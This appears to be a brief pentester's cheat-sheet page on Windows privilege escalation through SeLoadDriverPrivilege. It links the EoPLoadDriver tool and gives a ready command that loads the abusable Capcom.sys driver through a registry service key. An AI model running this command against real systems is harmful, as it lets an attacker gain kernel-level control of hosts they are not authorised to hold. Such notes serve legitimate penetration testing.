# Enable SeLoadDriver Privilege/EOPLoader

OS: Windows
Description: SeLoadDriver/EOPLoader
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Automate SeLoadDriver Privilege with EOPLoadDriver

```jsx
https://github.com/TarlogicSecurity/EoPLoadDriver/
```

```jsx
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```